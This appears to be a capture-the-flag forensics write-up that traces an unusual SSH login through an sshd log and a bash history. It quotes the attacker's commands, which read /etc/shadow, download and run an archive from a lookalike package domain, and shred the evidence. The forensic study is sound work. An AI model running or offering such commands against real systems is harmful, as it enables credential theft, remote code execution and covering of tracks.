---
layout: post
title:  "An Unsual Sighting"
date:   2025-04-07 12:00:00 -0400
categories: HTB-challenge forensics very-easy
tags: HTB CTF writeup 
---

### SOLUTION
We have 2 files to analyze: `bash_history.txt` and  `sshd.log`

**Q1: What is the IP Address and Port of the SSH Server (IP:PORT)**

Looking at `sshd.log` we can see this:

`[2024-01-28 15:24:23] Connection from 100.72.1.95 port 47721 on 100.107.36.130 port 2221 rdomain`

We get the answer
```
100.107.36.130:2221 
```

**Q2: What time is the first successful Login**

Search for `Accepted` and we get:

`[2024-02-13 11:29:50] Accepted password for root from 100.81.51.199 port 63172 ssh2`
```
2024-02-13 11:29:50
```

**Q3: What is the time of the unusual Login**

We can notice that all of the accepted IP addresses start with `100.` or higher. But there is only 1 different.

`[2024-02-19 04:00:14] Connection from 2.67.182.119 port 60071 on 100.107.36.130 port 2221 rdomain`

```
2024-02-19 04:00:14
```

**Q4: What is the Fingerprint of the attacker's public key**     

Looking at that IP address and its `SHA256`

```
OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
```

**Q5: What is the first command the attacker executed after logging in**                                                                                                               

Now look at `bash_history.txt` file, search for unusual login time and we get the answer.

```
whoami
```

**Q6: What is the final command the attacker executed before logging out**                                                                                                                 
By looking at the range of timestamp, we can guess the answer.

```
[2024-02-16 14:40:47] python ./server.py --tests
[2024-02-19 04:00:18] whoami
[2024-02-19 04:00:20] uname -a
[2024-02-19 04:00:40] cat /etc/passwd
[2024-02-19 04:01:01] cat /etc/shadow
[2024-02-19 04:01:15] ps faux
[2024-02-19 04:02:27] wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz
[2024-02-19 04:10:02] tar xvf latest.tar.gz
[2024-02-19 04:12:02] shred -zu latest.tar.gz
[2024-02-19 04:14:02] ./setup
[2024-02-20 11:11:14] nvim server.py

```                                                                                                               
